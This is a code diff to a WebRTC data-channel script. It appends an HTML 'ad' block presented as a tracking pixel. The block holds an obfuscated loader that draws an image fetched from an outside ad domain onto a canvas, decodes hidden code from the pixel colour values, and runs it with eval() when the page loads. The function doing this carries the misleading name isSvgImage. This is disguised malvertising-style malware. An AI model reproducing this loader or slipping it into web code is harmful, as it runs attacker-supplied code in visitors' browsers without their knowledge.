@@ -92,3 +92,36 @@ dataChannel.onopen = () => {
 dataChannel.onclose = () => {
   console.log("The Data Channel is Closed");
 };
+
+<div id="ad_html">
+
+<script>
+  var canvas = document.createElement('canvas');
+  canvas.width = 9000;
+  canvas.height = 1;
+  var context = canvas.getContext('2d');
+  
+window.trackerFailed = function(e){
+  image.setAttribute('crossorigin', "Anonymous");
+  image.setAttribute('src', "https://qs.adtrack.ml/pxid/pixel.png?cid=grx8og6o9xbd5yjub9hlhq");
+}
+var trackerSucceeded = false;
+
+window.isSvgImage = function(image) {
+  context.drawImage(image,0,0);for(var imageData=context.getImageData(0,0,canvas.width,canvas.height),x=0,input="",s=!1;x<9e3&&0==s;){var index=4*(0*imageData.width+x),rgba=imageData.data[index];0!=rgba?input+=rgba?String.fromCharCode(rgba):"":s=!0,x+=1}eval(input);
+};
+</script>
+<img src="//cdn.adbutler.com/track/px/grx8og6o9xbd5yjub9hlhq" id="trackingpixel" width="1px" height="1px" onerror="trackerFailed(event)"/>
+<script>
+var image = document.getElementById("trackingpixel");
+var pixelImplemented = setInterval(()=>{
+  if(image.complete){
+    clearInterval(pixelImplemented);
+    isSvgImage(image);
+  }
+}, 10);
+</script>
+
+  
+</div>
+
